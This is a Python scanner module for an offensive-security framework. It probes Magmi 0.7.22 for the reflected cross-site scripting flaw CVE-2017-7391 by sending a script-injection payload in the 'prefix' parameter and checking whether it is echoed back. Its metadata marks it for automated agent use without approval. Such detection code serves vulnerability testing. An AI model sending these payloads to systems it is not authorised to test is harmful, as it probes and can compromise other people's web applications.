#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Magmi 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Magmi 0.7.22 - Cross-Site Scripting Detection',
        'description': 'Magmi 0.7.22 contains a cross-site scripting vulnerability due to insufficient filtration of user-supplied data (prefix) passed to the magmi-git-master/magmi/web/ajax_gettime.php URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'magmi', 'xss', 'magmi_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/dweeves/magmi-git/issues/522',
            'https://github.com/dweeves/magmi-git/releases/download/0.7.22/magmi_full_0.7.22.zip',
            'https://github.com/dweeves/magmi-git/pull/525',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-7391',
            'https://github.com/d4n-sec/d4n-sec.github.io',
        ],
        'cve': 'CVE-2017-7391',
    }

    def run(self):
        r = self.http_request(method="GET", path='/magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"><script>alert(document.domain);</script><',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Magmi 0.7.22 - Cross-Site Scripting detected",
                path='/magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C',
            )
            return True
        return False

